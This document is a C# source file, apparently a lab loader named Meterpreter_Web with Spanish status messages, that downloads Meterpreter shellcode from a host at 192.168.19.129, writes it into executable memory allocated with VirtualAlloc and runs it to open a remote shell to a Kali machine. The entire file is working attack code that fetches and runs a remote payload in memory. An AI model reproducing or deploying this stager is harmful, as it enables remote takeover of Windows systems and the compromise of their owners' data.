using System;
using libreria;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;


namespace Meterpreter_Web
{
    internal class shell
    {
        static async Task Main(string[] args)
        {
            byte[] buf;

            using (var handler = new HttpClientHandler())
            {
                using (var client = new HttpClient(handler))
                {
                    // Download the shellcode
                    buf = await client.GetByteArrayAsync("http://192.168.19.129:8000/test.bin");
                    Console.WriteLine("[+] Descargando y almacenando la Meterpreter en memoria...");
                }
            }

            // Allocate a region of memory in this process as RW
            IntPtr ptr = Win32.VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(buf.Length), 0x1000, 0x40);
            Console.WriteLine("[+] Reservando un hueco para la shell es memoria...");
            //Copy Shellcode into the memory region
            Marshal.Copy(buf, 0x0, ptr, buf.Length);
            Console.WriteLine("[+] Copiando la shell al espacio reservado...");
            //Execute shell
            Win32.WindowRun punteroshell = Marshal.GetDelegateForFunctionPointer<Win32.WindowRun>(ptr);
            Console.WriteLine("[+] Ejecutando la shell de ese espacio reservado...");
            Console.WriteLine("[+] Revisa la Kali :)");
            punteroshell();

        }
    }
}

